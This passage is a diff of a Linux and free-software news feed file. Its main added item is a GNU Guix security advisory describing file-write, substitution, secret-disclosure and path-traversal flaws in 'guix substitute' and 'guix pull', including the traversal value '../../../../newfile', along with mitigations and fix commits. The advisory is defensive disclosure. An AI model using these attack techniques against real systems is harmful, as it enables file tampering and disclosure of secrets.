+&lt;p&gt;I am truly sorry, but there was just way too much going at work and in private, so I neglected my blogging for some time. &lt;a class=&quot;footnote-backref&quot; href=&quot;https://planet.kde.org/index.xml#fnref:sorry&quot; title=&quot;Jump back to footnote 1 in the text&quot;&gt;↩&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li id=&quot;fn:hack&quot;&gt;
+&lt;p&gt;You know the old adage: The fastest way to get an answer to your question on the internet, is to provide a false anwser and wait for everyone to rush to correct you &lt;code&gt;;)&lt;/code&gt; &lt;a class=&quot;footnote-backref&quot; href=&quot;https://planet.kde.org/index.xml#fnref:hack&quot; title=&quot;Jump back to footnote 2 in the text&quot;&gt;↩&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/div&gt;</description>
+      <pubDate>Wed, 01 Jul 2026 22:00:00 -0000</pubDate>
+      <guid isPermaLink="false">tag:matija.suklje.name,2026-07-02:/persistent-copyright-licensing-information-in-client-side-javascript-css-and-similar-feedback-and-second-proposal</guid>
+      <source url="https://planet.kde.org/index.xml">Planet KDE</source>
     </item>
     <item>
       <title>[Planet GNU] FSF Blogs: We&apos;re campaigning for free software. We need your help</title>
@@ -720,18 +820,6 @@ If you look at the G7’s Vision on AI Openness or the European Union’s Tech S
 &lt;img alt=&quot;&quot; height=&quot;1&quot; src=&quot;https://track-eu1.hubspot.com/__ptq.gif?a=149513&amp;amp;k=14&amp;amp;r=https%3A%2F%2Fwww.qt.io%2Fblog%2Frust-ui-framework-via-bridging-technology&amp;amp;bu=https%253A%252F%252Fwww.qt.io%252Fblog&amp;amp;bvt=rss&quot; style=&quot;width: 1px!important;&quot; width=&quot;1&quot; /&gt;</description>
       <pubDate>Wed, 01 Jul 2026 14:15:22 -0000</pubDate>
       <guid isPermaLink="false">https://www.qt.io/blog/rust-ui-framework-via-bridging-technology</guid>
-      <source url="https://planet.kde.org/index.xml">Planet KDE</source>
-    </item>
-    <item>
-      <title>[Planet KDE] Qt Bridges: Public Beta for the Rust Bridge Is Out!</title>
-      <link>https://www.qt.io/blog/qt-bridges-public-beta-for-rust</link>
-      <description>&lt;div class=&quot;hs-featured-image-wrapper&quot;&gt;
-&lt;a class=&quot;hs-featured-image-link&quot; href=&quot;https://www.qt.io/blog/qt-bridges-public-beta-for-rust?hsLang=en&quot; target=&quot;_blank&quot; title=&quot;&quot;&gt; &lt;img alt=&quot;Qt Bridges: Public Beta for the Rust Bridge Is Out!&quot; class=&quot;hs-featured-image&quot; src=&quot;https://www.qt.io/hubfs/QtBridges-Bridging-Technology-tinified.webp&quot; style=&quot;width: auto !important; float: left; margin: 0 15px 15px 0;&quot; /&gt; &lt;/a&gt;
-&lt;/div&gt;
-&lt;p&gt;&lt;a href=&quot;https://www.qt.io/development/qt-bridges?hsLang=en&quot; target=&quot;_blank&quot;&gt;Qt Bridges&lt;/a&gt; is a project we have been developing since 2025 to bring &lt;a href=&quot;https://www.qt.io/development/qt-framework/ui-framework?hsLang=en&quot; target=&quot;_blank&quot;&gt;Qt’s UI framework&lt;/a&gt; capabilities to other programming languages, without going through the full set of bindings. The focus is on the interaction with backend data objects, seamlessly integrated as QML components in a Qt Quick interface.&lt;/p&gt;
-&lt;img alt=&quot;&quot; height=&quot;1&quot; src=&quot;https://track-eu1.hubspot.com/__ptq.gif?a=149513&amp;amp;k=14&amp;amp;r=https%3A%2F%2Fwww.qt.io%2Fblog%2Fqt-bridges-public-beta-for-rust&amp;amp;bu=https%253A%252F%252Fwww.qt.io%252Fblog&amp;amp;bvt=rss&quot; style=&quot;width: 1px!important;&quot; width=&quot;1&quot; /&gt;</description>
-      <pubDate>Wed, 01 Jul 2026 14:15:20 -0000</pubDate>
-      <guid isPermaLink="false">https://www.qt.io/blog/qt-bridges-public-beta-for-rust</guid>
       <source url="https://planet.kde.org/index.xml">Planet KDE</source>
     </item>
     <item>
@@ -962,14 +1050,6 @@ addresses. We do not have the resources to reply to them.&lt;/strong&gt;&lt;/p&g
       <pubDate>Tue, 06 Aug 2024 19:40:29 -0000</pubDate>
       <guid isPermaLink="false">tag:www.kernel.org,2024-08-06:/contact.html</guid>
       <source url="https://www.kernel.org/feeds/all.atom.xml">kernel.org</source>
-    </item>
-    <item>
-      <title>[Linux Mint Blog] Monthly News – April 2026</title>
-      <link>https://blog.linuxmint.com/?p=5022</link>
-      <description>Hi everyone, Thank you for your support and your donations! Many thanks to everyone involved in helping Linux Mint. HWE ISOs Earlier this month we announced a longer development cycle and the decision not to release until Christmas 2026. To address compatibility issues with brand new hardware, we decided to start publishing updated ISO images [&amp;#8230;]</description>
-      <pubDate>Thu, 30 Apr 2026 16:42:56 -0000</pubDate>
-      <guid isPermaLink="false">https://blog.linuxmint.com/?p=5022</guid>
-      <source url="https://blog.linuxmint.com/?feed=rss2">Linux Mint Blog</source>
     </item>
     <item>
       <title>[BigLinux] BigLinux traz novos kerneis no seu repositório oficial.</title>
@@ -1300,14 +1380,6 @@ rewine (1):
       <source url="https://opensource.org/feed/">OSI</source>
     </item>
     <item>
-      <title>[Linux Mint Blog] Monthly News – March 2026</title>
-      <link>https://blog.linuxmint.com/?p=5019</link>
-      <description>Hi everyone, Before we start with the news, I’d like to apologize for posting so late. Release Strategy In February I mentioned we were at a crossroads and that it was the right time to consider important changes. The following decisions were made: Linux Mint will adopt a longer development lifecycle. The next release is [&amp;#8230;]</description>
-      <pubDate>Thu, 16 Apr 2026 11:27:22 -0000</pubDate>
-      <guid isPermaLink="false">https://blog.linuxmint.com/?p=5019</guid>
-      <source url="https://blog.linuxmint.com/?feed=rss2">Linux Mint Blog</source>
-    </item>
-    <item>
       <title>[Xfce News] Xfce 4.18 released</title>
       <link>https://xfce.org/about/news/?post=1671062400</link>
       <description>After almost two years of work, we are happy to announce the release of Xfce 4.18 !</description>
@@ -1408,7 +1480,7 @@ rewine (1):
       <title>[LWN] Full Story</title>
       <link>https://lwn.net/Articles/1080162/</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:06 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:50 -0000</pubDate>
       <guid isPermaLink="false">https://lwn.net/Articles/1080162/</guid>
       <source url="https://lwn.net/">LWN</source>
     </item>
@@ -1416,7 +1488,7 @@ rewine (1):
       <title>[LWN] local BPF storage API</title>
       <link>https://docs.ebpf.io/linux/helper-function/bpf_get_local_storage/</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:06 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:50 -0000</pubDate>
       <guid isPermaLink="false">https://docs.ebpf.io/linux/helper-function/bpf_get_local_storage/</guid>
       <source url="https://lwn.net/">LWN</source>
     </item>
@@ -1424,7 +1496,7 @@ rewine (1):
       <title>[LWN] Full Story</title>
       <link>https://lwn.net/Articles/1078968/</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:06 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:50 -0000</pubDate>
       <guid isPermaLink="false">https://lwn.net/Articles/1078968/</guid>
       <source url="https://lwn.net/">LWN</source>
     </item>
@@ -1432,7 +1504,7 @@ rewine (1):
       <title>[LWN] Secure Boot</title>
       <link>https://en.wikipedia.org/wiki/UEFI#Secure_Boot</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:06 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:50 -0000</pubDate>
       <guid isPermaLink="false">https://en.wikipedia.org/wiki/UEFI#Secure_Boot</guid>
       <source url="https://lwn.net/">LWN</source>
     </item>
@@ -1440,7 +1512,7 @@ rewine (1):
       <title>[LWN] Full Story</title>
       <link>https://lwn.net/Articles/1079808/</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:06 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:50 -0000</pubDate>
       <guid isPermaLink="false">https://lwn.net/Articles/1079808/</guid>
       <source url="https://lwn.net/">LWN</source>
     </item>
@@ -1448,7 +1520,7 @@ rewine (1):
       <title>[Linux Foundation] Measuring OSPO Value</title>
       <link>https://www.linuxfoundation.org/blog/measuring-ospo-value</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:02 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:45 -0000</pubDate>
       <guid isPermaLink="false">https://www.linuxfoundation.org/blog/measuring-ospo-value</guid>
       <source url="https://www.linuxfoundation.org/blog">Linux Foundation</source>
     </item>
@@ -1456,7 +1528,7 @@ rewine (1):
       <title>[Linux Foundation] Strengthening LFX Mentoring: A Fairer Stipend Model and a Shared Standard of Excellence</title>
       <link>https://www.linuxfoundation.org/blog/strengthening-lfx-mentoring-a-fairer-stipend-model-and-a-shared-standard-of-excellence</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:02 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:45 -0000</pubDate>
       <guid isPermaLink="false">https://www.linuxfoundation.org/blog/strengthening-lfx-mentoring-a-fairer-stipend-model-and-a-shared-standard-of-excellence</guid>
       <source url="https://www.linuxfoundation.org/blog">Linux Foundation</source>
     </item>
@@ -1464,7 +1536,7 @@ rewine (1):
       <title>[Linux Foundation] Who will be the senior engineers of 2036?</title>
       <link>https://www.linuxfoundation.org/blog/who-will-be-the-senior-engineers-of-2036</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:02 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:45 -0000</pubDate>
       <guid isPermaLink="false">https://www.linuxfoundation.org/blog/who-will-be-the-senior-engineers-of-2036</guid>
       <source url="https://www.linuxfoundation.org/blog">Linux Foundation</source>
     </item>
@@ -1472,7 +1544,7 @@ rewine (1):
       <title>[Linux Foundation] The CRA Readiness Reality: What Changed (and What Didn’t) Between 2025 and 2026?</title>
       <link>https://www.linuxfoundation.org/blog/the-cra-readiness-reality-what-changed-and-what-didnt-between-2025-and-2026</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:02 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:45 -0000</pubDate>
       <guid isPermaLink="false">https://www.linuxfoundation.org/blog/the-cra-readiness-reality-what-changed-and-what-didnt-between-2025-and-2026</guid>
       <source url="https://www.linuxfoundation.org/blog">Linux Foundation</source>
     </item>
@@ -1480,7 +1552,7 @@ rewine (1):
       <title>[Linux Foundation] Linux Foundation Newsletter: June 2026</title>
       <link>https://www.linuxfoundation.org/blog/linux-foundation-newsletter-june-2026</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:02 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:45 -0000</pubDate>
       <guid isPermaLink="false">https://www.linuxfoundation.org/blog/linux-foundation-newsletter-june-2026</guid>
       <source url="https://www.linuxfoundation.org/blog">Linux Foundation</source>
     </item>
@@ -1488,7 +1560,7 @@ rewine (1):
       <title>[Viva o Linux] Vaticano cria comissão para coordenar uso de inteligência artificial entre seus órgãos</title>
       <link>https://www.vivaolinux.com.br/noticia/vaticano-cria-comissao-para-coordenar-uso-de-inteligencia-artificial-entre-seus-orgaos/</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:01 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:44 -0000</pubDate>
       <guid isPermaLink="false">https://www.vivaolinux.com.br/noticia/vaticano-cria-comissao-para-coordenar-uso-de-inteligencia-artificial-entre-seus-orgaos/</guid>
       <source url="https://www.vivaolinux.com.br/">Viva o Linux</source>
     </item>
@@ -1496,7 +1568,7 @@ rewine (1):
       <title>[Viva o Linux] Brave Origin chega ao Linux com modo minimalista e grátis</title>
       <link>https://www.vivaolinux.com.br/dica/Brave-Origin-chega-ao-Linux-com-modo-minimalista-e-gratis/</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:01 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:44 -0000</pubDate>
       <guid isPermaLink="false">https://www.vivaolinux.com.br/dica/Brave-Origin-chega-ao-Linux-com-modo-minimalista-e-gratis/</guid>
       <source url="https://www.vivaolinux.com.br/">Viva o Linux</source>
     </item>
@@ -1504,7 +1576,7 @@ rewine (1):
       <title>[Viva o Linux] Tails 7.9.1 corrige falhas no kernel e atualiza o Tor Browser</title>
       <link>https://www.vivaolinux.com.br/noticia/tails-7-9-1-corrige-falhas-no-kernel-e-atualiza-o-tor-browser/</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:01 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:44 -0000</pubDate>
       <guid isPermaLink="false">https://www.vivaolinux.com.br/noticia/tails-7-9-1-corrige-falhas-no-kernel-e-atualiza-o-tor-browser/</guid>
       <source url="https://www.vivaolinux.com.br/">Viva o Linux</source>
     </item>
@@ -1512,7 +1584,7 @@ rewine (1):
       <title>[Viva o Linux] Rocky Linux 10.2 chega com avanços em criptografia pós-quântica</title>
       <link>https://www.vivaolinux.com.br/noticia/rocky-linux-10-2-chega-com-avancos-em-criptografia-pos-quantica/</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:01 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:44 -0000</pubDate>
       <guid isPermaLink="false">https://www.vivaolinux.com.br/noticia/rocky-linux-10-2-chega-com-avancos-em-criptografia-pos-quantica/</guid>
       <source url="https://www.vivaolinux.com.br/">Viva o Linux</source>
     </item>
@@ -1520,9 +1592,33 @@ rewine (1):
       <title>[Viva o Linux] Ubuntu prepara o Myna, um ditado por IA local para falar e ver o texto aparecer</title>
       <link>https://www.vivaolinux.com.br/noticia/ubuntu-prepara-o-myna-um-ditado-por-ia-local-para-falar-e-ver-o-texto-aparecer/</link>
       <description></description>
-      <pubDate>Thu, 02 Jul 2026 21:07:01 -0000</pubDate>
+      <pubDate>Thu, 02 Jul 2026 23:09:44 -0000</pubDate>
       <guid isPermaLink="false">https://www.vivaolinux.com.br/noticia/ubuntu-prepara-o-myna-um-ditado-por-ia-local-para-falar-e-ver-o-texto-aparecer/</guid>
       <source url="https://www.vivaolinux.com.br/">Viva o Linux</source>
+    </item>
+    <item>
+      <title>[The Verge] Tesla driver faces manslaughter charges over Texas crash that killed a woman inside her home</title>
+      <link>https://www.theverge.com/transportation/961161/tesla-fsd-katy-tx-manslaughter-charges</link>
+      <description>The man whose Tesla struck and killed a woman inside her Texas home last month is now facing manslaughter charges, as reported earlier by The Wall Street Journal and local news outlet KHOU 11. 44-year-old Michael Butler was arrested on Wednesday and claimed to have been driving his Model 3 using Tesla&apos;s Full-Self Driving (FSD) [&amp;#8230;]</description>
+      <pubDate>Thu, 02 Jul 2026 22:09:33 -0000</pubDate>
+      <guid isPermaLink="false">https://www.theverge.com/?p=961161</guid>
+      <source url="https://www.theverge.com/rss/index.xml">The Verge</source>
+    </item>
+    <item>
+      <title>[Phoronix] Fedora 45 Considering x86_64 Shadow Stack Usage By Default</title>
+      <link>https://www.phoronix.com/news/Fedora-45-Consider-Shadow-Stack</link>
+      <description>A change proposal under consideration for Fedora Linux 45 would enable x86_64 Shadow Stack usage by default in the name of better security on modern Intel and AMD systems...</description>
+      <pubDate>Thu, 02 Jul 2026 21:17:35 -0000</pubDate>
+      <guid isPermaLink="false">https://www.phoronix.com/news/Fedora-45-Consider-Shadow-Stack</guid>
+      <source url="https://www.phoronix.com/rss.php">Phoronix</source>
+    </item>
+    <item>
+      <title>[The Verge] Meta has a new app called Pocket that is absolutely nothing like the old Pocket</title>
+      <link>https://www.theverge.com/tech/961086/meta-pocket-app-gizmo-ai</link>
+      <description>Mozilla shut down the well-loved read-it-later Pocket app last year, and now Meta is launching an app called Pocket with an entirely different, AI-focused pitch: this new app lets you make and share little interactive &quot;gizmos&quot; built from an AI prompt, as reported by Business Insider. Meta CEO Mark Zuckerberg is all in on AI [&amp;#8230;]</description>
+      <pubDate>Thu, 02 Jul 2026 21:09:06 -0000</pubDate>
+      <guid isPermaLink="false">https://www.theverge.com/?p=961086</guid>
+      <source url="https://www.theverge.com/rss/index.xml">The Verge</source>
     </item>
     <item>
       <title>[The Verge] The best July 4th sales we found so far</title>
@@ -1565,6 +1661,633 @@ rewine (1):
       <source url="https://www.phoronix.com/rss.php">Phoronix</source>
     </item>
     <item>
+      <title>[Planet GNU] GNU Guix: ‘guix substitute‘ and ‘guix pull‘ Vulnerabilities</title>
+      <link>https://guix.gnu.org/blog/2026/guix-substitute-pull-vulnerabilities//</link>
+      <description>&lt;p&gt;Several security issues (CVE IDs pending) have been identified in &lt;code&gt;guix substitute&lt;/code&gt;, a helper utility invoked by
+&lt;a href=&quot;https://guix.gnu.org/manual/devel/en/html_node/Invoking-guix_002ddaemon.html&quot;&gt;&lt;code&gt;guix-daemon&lt;/code&gt;&lt;/a&gt;,
+which enable a variety of harmful activities including &lt;strong&gt;remote privilege
+escalation to the build daemon user&lt;/strong&gt;, &lt;strong&gt;remote store corruption&lt;/strong&gt;, and
+potentially &lt;strong&gt;local disclosure of sensitive files&lt;/strong&gt; accessible to the build
+daemon user. All systems are affected, whether or not &lt;code&gt;guix-daemon&lt;/code&gt; is running
+with root privileges; the harm that can be done when &lt;code&gt;guix-daemon&lt;/code&gt; runs without
+root privileges is more limited. You are strongly advised to &lt;strong&gt;upgrade your
+daemon&lt;/strong&gt; now (see instructions below), &lt;strong&gt;carefully considering whether to pass
+&lt;code&gt;--no-substitutes&lt;/code&gt; to all guix commands when you do so (see note in Upgrading
+section)&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;The remote exploitation of &lt;code&gt;guix substitute&lt;/code&gt; only requires that the vulnerable
+system attempt to download a binary substitute.  Any configured substitute
+server, including ones discovered using &lt;code&gt;guix-daemon&lt;/code&gt;&apos;s &lt;code&gt;--discover&lt;/code&gt; option, can
+exploit this, and so can a man-in-the-middle (MITM), regardless of whether
+&lt;code&gt;https&lt;/code&gt; is used in the substitute server urls.&lt;/p&gt;&lt;p&gt;The local exploitation of &lt;code&gt;guix substitute&lt;/code&gt; only requires the ability to connect
+to &lt;code&gt;guix-daemon&lt;/code&gt;&apos;s socket, which by default any user can do.&lt;/p&gt;&lt;p&gt;Separately, another security issue (CVE ID pending) was identified in &lt;code&gt;guix pull&lt;/code&gt; and &lt;code&gt;guix time-machine&lt;/code&gt;, which enables anyone who can control the channels
+file used by these commands to cause a file to be created or overwritten
+wherever the user running the command in question has permission to create
+them. This is possible regardless of whether the channels file is evaluated in a
+sandbox and whether the channels used are limited to those sharing an
+introduction with a trusted channel. Due to limitations on the content of the
+created or overwritten file, this primarily represents a &lt;strong&gt;denial-of-service&lt;/strong&gt;
+risk, though in theory it could do more.&lt;/p&gt;&lt;h1&gt;Vulnerabilities&lt;/h1&gt;&lt;p&gt;Three distinct vulnerabilities have been identified affecting &lt;code&gt;guix substitute&lt;/code&gt;,
+with a fourth affecting &lt;code&gt;guix pull&lt;/code&gt; and &lt;code&gt;guix time-machine&lt;/code&gt;:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;(CVE assignment pending) The procedure that Guile code uses to unpack
+substitutes, &lt;code&gt;restore-file&lt;/code&gt; in &lt;code&gt;(guix serialization)&lt;/code&gt;, was not hardened
+against malicious input, but it was called to extract the substitute being
+downloaded as it was being downloaded, rather than waiting until after the
+entire archive had been obtained &lt;em&gt;and its hash had been verified&lt;/em&gt;. These
+facts together make it possible for any substitute server (or any entity that
+can impersonate one) to write arbitrary files to any place on an affected
+system that the daemon user has permission to write to. In the case of the
+daemon running as root, that includes &lt;code&gt;/etc/passwd&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;To avoid depending on the X.509 Public Key Infrastructure, the procedure that
+fetches metadata about available substitutes (called &lt;em&gt;narinfos&lt;/em&gt;),
+&lt;code&gt;fetch-narinfos&lt;/code&gt;, does not verify server certificates, since the canonical
+parts of narinfos need to be signed anyway to be considered valid.
+Unfortunately the substitute URL is not one such canonical part, and so it
+can be replaced with an attacker-controlled URL.  If the substitute
+downloaded doesn&apos;t match the signed hash in the narinfo, it will be rejected,
+but by then it is too late: the substitute was extracted as it was being
+downloaded, so the damage is already done.&lt;/p&gt;&lt;p&gt;This means that even though &lt;code&gt;download-nar&lt;/code&gt;, the procedure responsible for
+actually downloading the substitute, does itself verify server certificates,
+using &lt;code&gt;https&lt;/code&gt; in substitute server urls cannot limit who can exploit this, as
+the certificate only needs to be appropriate for the attacker-controlled URL.&lt;/p&gt;&lt;p&gt;&lt;code&gt;restore-file&lt;/code&gt; is also used by other utilities, including &lt;code&gt;guix offload&lt;/code&gt;,
+&lt;code&gt;guix archive --extract&lt;/code&gt;, and &lt;code&gt;guix challenge&lt;/code&gt;.  These can all be exploited
+in the same way if untrusted input is given to them.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(CVE assignment pending) The procedure that fetches metadata about available
+substitutes (called &lt;em&gt;narinfos&lt;/em&gt;), &lt;code&gt;fetch-narinfos&lt;/code&gt; in &lt;code&gt;(guix substitutes)&lt;/code&gt;,
+does not verify that the narinfo it got is the one it asked for, nor do any
+of its callers in &lt;code&gt;(guix scripts substitute)&lt;/code&gt;. Consequently, it is possible
+for a substitute server (or anyone who can impersonate one) to trick &lt;code&gt;guix substitute&lt;/code&gt; into using any store item for which there is an authorized
+substitute as a substitute for any other store item for which there is an
+authorized substitute. The complete extent of harm that can be caused by this
+depends in part on what store items an authorized substitute server has
+signed or can be convinced to sign, but at minimum this can be used to cause
+outdated and insecure versions of software to be used.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(CVE assignment pending) The implementation of &lt;code&gt;guix substitute&lt;/code&gt; in &lt;code&gt;(guix scripts substitute)&lt;/code&gt; permits &lt;code&gt;file://&lt;/code&gt; URIs to be used both for specifying
+substitute server URIs (where to look for narinfos) and for specifying within
+narinfos where to download the corresponding archive from. It does not
+distinguish between &lt;code&gt;--substitute-urls&lt;/code&gt; passed on the &lt;code&gt;guix-daemon&lt;/code&gt; command
+line and &lt;code&gt;--substitute-urls&lt;/code&gt; passed on the &lt;code&gt;guix&lt;/code&gt; command line (client-side),
+with the latter taking precedence over the former. Opening of these &lt;code&gt;file://&lt;/code&gt;
+URIs follows symbolic links. Consequently, an untrusted client may cause any
+file that the daemon can read to be read. If a given line of it doesn&apos;t look
+like a valid narinfo line (it uses recutils format), &lt;code&gt;guix substitute&lt;/code&gt; may
+throw an exception, causing a backtrace containing that line to be passed
+through to the client. So, for example, a file containing a single line
+containing only a secret passphrase may have its contents revealed to any
+local user if the daemon user can read it.&lt;/p&gt;&lt;p&gt;Additionally, when a &lt;code&gt;file://&lt;/code&gt; URI is used as the URI of a nar to download,
+it may be written to the store if it happens to be a valid nar (&quot;normalized
+archive&quot;) as used by Guix and Nix. This is unlikely, though.&lt;/p&gt;&lt;p&gt;In addition to possibly causing secrets to be disclosed, this can also be
+used to interfere with the reading of any file being read by any process that
+the daemon user could trace, through the use of files in &lt;code&gt;/proc/PID/fd&lt;/code&gt;.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;(CVE assignment pending) The procedure which &lt;code&gt;guix pull&lt;/code&gt; and &lt;code&gt;guix time-machine&lt;/code&gt; use to authenticate channels, &lt;code&gt;authenticate-channel&lt;/code&gt; in &lt;code&gt;(guix channels)&lt;/code&gt;, passed a cache key derived from the channel name to
+&lt;code&gt;authenticate-repository&lt;/code&gt; in &lt;code&gt;(guix git-authenticate)&lt;/code&gt;. This cache key was
+used to determine a filename for storing previously-authenticated commit IDs
+in. If the channel name was of the form &quot;../../../../newfile&quot;, it could have
+caused &quot;newfile&quot; to be created in the user&apos;s home directory. It may also have
+overwritten &quot;newfile&quot; if it already existed, but only if it already looked
+like a Scheme-syntax list of strings, since the contents would have to have
+first been read and processed before new contents would have been written.&lt;/p&gt;&lt;p&gt;In the event that a write is performed, the output will only include a
+Scheme-syntax comment, newline, and list of hexadecimal strings corresponding
+to git commit identifiers. This makes it difficult to use for a practical
+attack other than a denial-of-service, but note that since it can target
+files in &lt;code&gt;/proc&lt;/code&gt;, a sufficiently creative and informed attacker may be able
+to exploit this further.&lt;/p&gt;&lt;p&gt;Realistically, this vulnerability can only be exploited when fetching remote
+channel files with the &lt;a href=&quot;https://guix.gnu.org/blog/2026/time-travel-without-borders/&quot;&gt;newly-added mechanism for doing
+so&lt;/a&gt;.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h1&gt;Mitigation&lt;/h1&gt;&lt;p&gt;Vulnerabilities (1) and (2) can be mitigated against remote attackers by not
+using substitutes, either by passing &lt;code&gt;--no-substitutes&lt;/code&gt; to &lt;code&gt;guix-daemon&lt;/code&gt; or
+passing &lt;code&gt;--no-substitutes&lt;/code&gt; to all &lt;code&gt;guix&lt;/code&gt; commands. It&apos;s always possible to turn
+substitutes back on for an individual client, though, so this doesn&apos;t work to
+defend against a local attacker exploiting (1), (2), or (3), which cannot be
+mitigated and must be fixed by updating. Vulnerability (4) can be mitigated by
+not running &lt;code&gt;guix pull&lt;/code&gt; or &lt;code&gt;guix time-machine&lt;/code&gt; with an untrusted channels file.&lt;/p&gt;&lt;p&gt;A test for the presence of these vulnerabilities is available at the end of this
+post. One can run this code with:&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;guix repl -- guix-substitute-and-pull-vuln-check.scm&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will finish with a sequence of 4 lines, beginning with &lt;code&gt;restore-file&lt;/code&gt;,
+&lt;code&gt;fetch-narinfos&lt;/code&gt;, &lt;code&gt;file-uris&lt;/code&gt;, and &lt;code&gt;cache-key&lt;/code&gt; respectively, each followed by a
+colon, a space, and either &lt;code&gt;vulnerable&lt;/code&gt; or &lt;code&gt;not vulnerable&lt;/code&gt; depending on whether
+the running &lt;code&gt;guix-daemon&lt;/code&gt; has the indicated vulnerability or not. If all 4 lines
+contain &lt;code&gt;not vulnerable&lt;/code&gt;, then &lt;code&gt;guix repl&lt;/code&gt; will exit with status code 0,
+otherwise it will exit with status code 1.&lt;/p&gt;&lt;p&gt;Some of the tests can fail to produce a result in some cases. In this case the
+output following the test name will start with &lt;code&gt;error:&lt;/code&gt;. A test that fails to
+produce a result should be regarded as inconclusive.&lt;/p&gt;&lt;p&gt;The &lt;code&gt;restore-file&lt;/code&gt; and &lt;code&gt;fetch-narinfos&lt;/code&gt; tests may fail to produce a result if no
+substitutes are authorized, or if no authorized substitutes for the current
+guix&apos;s &lt;code&gt;cfunge&lt;/code&gt;, &lt;code&gt;hello&lt;/code&gt;, or &lt;code&gt;sed&lt;/code&gt; packages can be accessed through any of the
+configured substitute urls. The &lt;code&gt;restore-file&lt;/code&gt; test may fail to produce a result
+if &lt;code&gt;cfunge&lt;/code&gt; is reachable from some garbage collection root, such as a
+profile. The &lt;code&gt;cache-key&lt;/code&gt; test may fail to produce a result if network access to
+codeberg to fetch a small portion of the history of the &lt;code&gt;guix-science&lt;/code&gt; channel
+is not available, which can be worked around by editing the script&apos;s definition
+of &lt;code&gt;guix-science-url&lt;/code&gt; to be any URL (or a filename) at which a copy of the
+&lt;code&gt;guix-science&lt;/code&gt; repository can be found.&lt;/p&gt;&lt;h1&gt;Fixes&lt;/h1&gt;&lt;p&gt;These security issues have been fixed by a series of 11 commits, starting with
+&lt;a href=&quot;https://codeberg.org/guix/guix/commit/ed0a9721f8a20d6ddcf6a0495302f502b3f7bb17&quot;&gt;ed0a9721f8a20d6ddcf6a0495302f502b3f7bb17&lt;/a&gt; and ending with
+&lt;a href=&quot;https://codeberg.org/guix/guix/commit/2ef8ed9f0df53bddf14bdecc2ea48c2d233213cc&quot;&gt;2ef8ed9f0df53bddf14bdecc2ea48c2d233213cc&lt;/a&gt; as part of pull
+request &lt;a href=&quot;https://codeberg.org/guix/guix/pulls/9665&quot;&gt;#9665&lt;/a&gt;. Users should
+make sure they have upgraded to commit
+&lt;a href=&quot;https://codeberg.org/guix/guix/commit/897832f374dcdc9eeaf19d01e70b9a92fccfc68c&quot;&gt;897832f374dcdc9eeaf19d01e70b9a92fccfc68c&lt;/a&gt; or any later commit to be
+protected from these vulnerabilities. Upgrade instructions are in the following
+section.&lt;/p&gt;&lt;p&gt;Fixing vulnerability (1) involved hardening &lt;code&gt;restore-file&lt;/code&gt; so that it detects
+and rejects invalid directory entry names. Specifically, entry names must be
+unique, in strictly ascending order, not empty, not equal to &quot;.&quot; or &quot;..&quot;, and
+not containing &quot;/&quot; or null bytes. Additionally, procedures currently used as the
+&lt;code&gt;#:dump-file&lt;/code&gt; argument to &lt;code&gt;restore-file&lt;/code&gt; were modified to insist on creating the
+target file afresh and never follow symbolic links.&lt;/p&gt;&lt;p&gt;The inspiration for that last change came from looking at the implementation of
+nar-parsing in &lt;code&gt;parse&lt;/code&gt; in &lt;code&gt;nix/libutil/archive.cc&lt;/code&gt;, where it was determined that
+that implementation was not vulnerable, but was about as close to vulnerable as
+it could get without actually being vulnerable, only barely being saved by the
+fact that the filesystem primitives used all refused to follow symbolic links or
+accept an existing target (see &lt;a href=&quot;https://codeberg.org/guix/guix/commit/3e5c3217f334805531e5db1680d97490999253f7&quot;&gt;this commit
+message&lt;/a&gt; for
+details). To avoid wasting another 3 hours trying to determine this the next
+time anyone tries looking at it with a critical eye, that implementation was
+also rewritten to be stricter and more obviously secure. It is perhaps not
+surprising that the same code led to CVE-2024-45593 in Nix when it was modified
